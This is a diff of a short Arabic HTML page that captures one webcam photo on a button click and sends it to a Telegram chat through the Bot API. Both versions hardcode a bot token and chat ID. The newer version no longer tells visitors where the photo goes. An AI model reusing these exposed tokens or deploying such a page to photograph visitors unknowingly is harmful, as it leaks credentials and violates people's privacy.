@@ -2,129 +2,62 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تطبيق الكاميرا السحابي</title>
+    <title>كاميرا البوت</title>
     <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0; 
-            background: #1a1a2e; 
-            color: white; 
-        }
-        .card { 
-            background: #16213e; 
-            padding: 40px; 
-            border-radius: 25px; 
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5); 
-            text-align: center; 
-            width: 90%; 
-            max-width: 400px; 
-            border: 1px solid #0f3460;
-        }
-        h2 { margin-bottom: 10px; color: #e94560; }
-        p { color: #95a5a6; font-size: 0.9rem; line-height: 1.6; }
-        button { 
-            background: #e94560; 
-            color: white; 
-            border: none; 
-            padding: 15px 30px; 
-            border-radius: 50px; 
-            cursor: pointer; 
-            font-size: 1.1rem; 
-            font-weight: bold; 
-            width: 100%; 
-            transition: 0.3s; 
-            margin-top: 20px;
-        }
-        button:hover { background: #ff4d6d; transform: translateY(-3px); }
-        #status { margin-top: 20px; font-size: 0.85rem; color: #00d2ff; }
-        canvas { display: none; }
+        body { background: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        button { background: #e94560; color: white; border: none; padding: 20px 40px; border-radius: 50px; font-size: 20px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>مرحباً بك 🤖</h2>
-    <p>اضغط على الزر أدناه لتجربة التقاط الصورة وإرسالها إلى التلجرام الخاص بك.</p>
-    <button id="capture-btn">إرسال صورة الآن 📸</button>
-    <div id="status">جاهز للعمل..</div>
-</div>
-
-<canvas id="canvas"></canvas>
+    <button id="capture-btn">التقط صورة وأرسلها 📸</button>
+    <p id="status"></p>
+    <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-    // البيانات الخاصة بك مدمجة وجاهزة
-    const TELEGRAM_TOKEN = '8728314672:AAFTjj5mEdbraaqtBxpfQoVFrNr79fgiYug';
-    const CHAT_ID = '8169635171'; 
+    const TELEGRAM_TOKEN = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
+    const CHAT_ID = '8169635171'; // هذا هو الآيدي الذي زودتني به سابقاً
 
     const captureBtn = document.getElementById('capture-btn');
     const statusText = document.getElementById('status');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    captureBtn.addEventListener('click', async function() {
-        statusText.innerText = "⚡ جاري فتح الكاميرا...";
-        
+    captureBtn.addEventListener('click', async () => {
         try {
-            // طلب الوصول للكاميرا
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: false 
-            });
-
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            statusText.innerText = "📸 التقطت! جاري الإرسال...";
-
-            // تأخير ثانية لضمان جودة الصورة
-            setTimeout(() => {
+            setTimeout(async () => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // إيقاف الكاميرا فوراً
                 stream.getTracks().forEach(track => track.stop());
 
-                // تحويل الصورة وإرسالها للتلجرام
-                canvas.toBlob(function(blob) {
+                canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'capture.png');
-                    formData.append('caption', '🚀 تم استقبال صورة جديدة من موقعك على GitHub!');
+                    formData.append('photo', blob, 'image.png');
 
-                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
-                    })
-                    .then(res => res.json())
-                    .then(data => {
-                        if (data.ok) {
-                            statusText.innerText = "✅ وصلت الصورة إلى حسابك!";
-                            statusText.style.color = "#2ecc71";
-                        } else {
-                            statusText.innerText = "❌ خطأ: " + data.description;
-                        }
-                    })
-                    .catch(err => {
-                        statusText.innerText = "❌ فشل الاتصال بالخادم";
-                        console.error(err);
                     });
+                    
+                    const result = await response.json();
+                    if(result.ok) {
+                        statusText.innerText = "✅ تم الإرسال بنجاح!";
+                    } else {
+                        statusText.innerText = "❌ خطأ: " + result.description;
+                    }
                 }, 'image/png');
-
             }, 1000);
-
-        } catch (error) {
-            statusText.innerText = "❌ يجب السماح بالكاميرا واستخدام HTTPS";
-            console.error(error);
+        } catch (e) {
+            statusText.innerText = "❌ تعذر الوصول للكاميرا";
         }
     });
 </script>
-
 </body>
 </html>
